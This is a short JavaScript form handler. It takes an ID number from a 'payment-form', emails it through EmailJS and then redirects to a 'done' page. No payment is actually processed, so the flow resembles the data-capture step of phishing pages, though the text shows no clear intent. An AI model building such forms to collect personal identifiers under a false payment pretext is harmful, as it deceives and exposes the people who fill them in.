

// Import EmailJS
//import emailjs from 'emailjs-com';

// Get the form element
const form = document.getElementById('payment-form');

// Add event listener to the form submit event
form.addEventListener('submit', (e) => {
  e.preventDefault();
  
  // Get the form data
 const idNumber = document.getElementById('ID-Number').value;
  

  // Check if all fields are filled
  if ( !idNumber ) {
    alert('Please fill all details');
    return;
  }

  // Send the form data to EmailJS
  emailjs.send('service_9psisa9', 'template_n3thi1c', {
   
   idnumber: idNumber,
    
  })
  .then((response) => {
    console.log('Success!', response.status, response.text);
    alert('Details submitted for payment');
    // Reset the form
    form.reset();

    // Add the condition to load another page with file path
  window.location.href = 'donePage.html';
    
  })
  .catch((error) => {
    console.error('Error:', error);
  });
});   